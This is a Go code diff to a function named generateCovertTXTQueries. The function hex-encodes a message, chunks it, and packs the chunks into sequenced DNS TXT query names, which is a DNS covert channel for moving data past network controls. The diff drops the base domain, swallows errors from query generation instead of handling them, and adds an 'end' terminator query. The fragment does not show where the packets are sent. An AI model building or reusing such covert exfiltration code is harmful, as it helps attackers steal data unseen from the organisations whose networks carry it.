@@ -57,7 +57,6 @@ func generateCovertTXTQueries(message string) ([][]byte, error) {
 	encodedData := hex.EncodeToString(covertData) // Encode message to Hex
 
 	// Domain labels have a max length of 63 chars. Hex encoding doubles the size.
-	// Let's choose a chunk size for the *encoded* data. 60 is safe.
 	const encodedChunkSize = 60
 	sequenceNumber := 0
 	dnsQueryPackets := make([][]byte, 0)
@@ -72,22 +71,23 @@ func generateCovertTXTQueries(message string) ([][]byte, error) {
 		fmt.Printf("Chunk: %s\n", chunk)
 
 		// Construct the full domain name for the query
-		// Format: [hex_chunk].[sequence_number].[base_domain]
-		queryDomain := fmt.Sprintf("%s.%d.%s", chunk, sequenceNumber, BASE_DOMAIN)
+		// Format: [hex_chunk].[sequence_number]
+		queryText := fmt.Sprintf("%s.%d", chunk, sequenceNumber)
+
+		fmt.Printf("Query Text: %s\n", queryText)
 
 		// Generate the DNS TXT query packet
-		dnsQueryPacket, err := generateDNSTXTQuery(queryDomain)
-		if err != nil {
-			fmt.Printf("Error generating DNS query packet: %s\n", err)
-			// Decide whether to continue or stop on error
-			continue // Skip this chunk
-		}
+		dnsQueryPacket, _ := generateDNSTXTQuery(queryText)
 
 		// Send the DNS query packet
 		dnsQueryPackets = append(dnsQueryPackets, dnsQueryPacket)
 
 		sequenceNumber++
 	}
+
+	endQueryText := fmt.Sprintf("end.%d", sequenceNumber)
+	endQuery, _ := generateDNSTXTQuery(endQueryText)
+	dnsQueryPackets = append(dnsQueryPackets, endQuery)
 
 	return dnsQueryPackets, nil
 }
